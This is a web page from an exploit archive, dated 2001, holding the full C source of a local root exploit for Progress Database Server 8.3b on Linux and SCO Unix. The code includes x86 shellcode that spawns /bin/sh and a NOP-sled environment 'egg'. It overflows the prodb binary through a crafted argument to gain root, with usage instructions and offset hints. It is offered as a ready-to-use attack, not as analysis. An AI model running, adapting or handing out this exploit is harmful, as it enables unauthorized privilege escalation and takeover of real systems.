<html><head><title>Progress Database Server 8.3b (prodb) Local Root Exploit</title></head><pre>/* progress database server v8.3b local root compromise.
 * for sco-unix and linux
 *
 * [on linux redhat 6.2 and SCO_SV scosysv 3.2 5.05
 *
 * this is just one of it, advisory about the bug discovery grabbed
 * from packetstorm, which was originally found by: krfinisterre@checkfree.com
 *
 * exploit usage: ./prodbx &lt;distro&gt; [offset]
 *
 * just some quick greets to: wildcoyote, lucipher, tasc, pyra, calimonk
 *          script0r, tozz, c-murdah and cerial
 *
 * - The Itch / BsE
 */
 
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
 
#define DEFAULT_OFFSET 0
#define DEFAULT_EGG_SIZE 2048
#define DEFAULT_BUFFER_SIZE 4200
#define NOP 0x90
 
unsigned long get_sp(void)
{
  __asm__(&quot;movl %esp, %eax&quot;);
}
 
/* regular shellcode for linux on the x86 */
char linux_shellcode[] =
  &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
  &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
  &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;
 
/* shellcode found (and used) in the advisory */
char sco_shellcode[] =
  &quot;\x89\xe6\x83\xc6\x30\xb8\x2e\x62\x69\x6e\x40\x89\x06\xb8\x2e\x73&quot;
  &quot;\x68\x21\x40\x89\x46\x04\x29\xc0\x88\x46\x07\x89\x76\x0c\xb0\x0b&quot;
  &quot;\x87\xf3\x8d\x4b\x08\x8d\x53\x0c\xcd\x80&quot;;

int main(int argc, char *argv[])
{
  char *buff;
  char *egg;
  char *ptr;
  long *addr_ptr;
  long addr;
  int offset = DEFAULT_OFFSET;
  int bsize = DEFAULT_BUFFER_SIZE;
  int eggsize = DEFAULT_EGG_SIZE;
  int unixtype = 0;
  int i;
 
  if(argc &lt; 2) 
  {
    printf(&quot;\nProgress Database Server v8.3b local root\n&quot;);  
    printf(&quot;\nUsage: %s &lt;*nix type&gt; [offset]\n\n&quot;, argv[0]);
    printf(&quot;1 = linux\n&quot;);
    printf(&quot;2 = sco-unix\n\n&quot;);
    printf(&quot;offset is not required, but should be near -50 through 50\n\n&quot;);  
    exit(0);
  }

  if(argc &gt; 1) { unixtype = atoi(argv[1]); }
  if(argc &gt; 2) { offset = atoi(argv[2]); }
 
  if(!(buff = malloc(bsize)))  
  {
    printf(&quot;Unable to allocate memory for %d bytes\n&quot;, bsize);
    exit(0);
  }
 
  if(!(egg = malloc(eggsize)))
  {
    printf(&quot;Unable to allocate memory for %d bytes\n&quot;, eggsize);
    exit(0);
  }
 
  addr = get_sp() - offset;
 
  printf(&quot;\n --== Progress Database Server 8.3b local root ==--\n&quot;);
  printf(&quot;         Coded by The Itch / BsE\n\n&quot;);
  printf(&quot;Using return address: 0x%x\n&quot;, addr);
  printf(&quot;Using offset      : %d\n&quot;, offset);
  printf(&quot;Using buffersize    : %d\n&quot;, bsize);
 
  ptr = buff;
  addr_ptr = (long *) ptr;  
  for(i = 0; i &lt; bsize; i+=4) { *(addr_ptr++) = addr; }
 
  ptr = egg;
  if(unixtype == 1) { for(i = 0; i &lt; eggsize - strlen(linux_shellcode) -1; i++) { *(ptr++) = NOP; } }
  if(unixtype == 2) { for(i = 0; i &lt; eggsize - strlen(sco_shellcode) -1; i++) { *(ptr++) = NOP; } }

  if(unixtype == 1) { for(i = 0; i &lt; strlen(linux_shellcode); i++) { *(ptr++) = linux_shellcode[i]; } }
  if(unixtype == 2) { for(i = 0; i &lt; strlen(sco_shellcode); i++) { *(ptr++) = sco_shellcode[i]; } } 

  buff[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';
  memcpy(egg, &quot;EGG=&quot;, 4);
  putenv(egg);
  memcpy(buff, &quot;RET=&quot;, 4);
  putenv(buff);
 
  /* adjust path of prodb accordingly... */
  system(&quot;/usr/dlc/bin/prodb  sports $RET&quot;);
 
  return 0;
}      


// milw0rm.com [2001-03-04]</pre></html>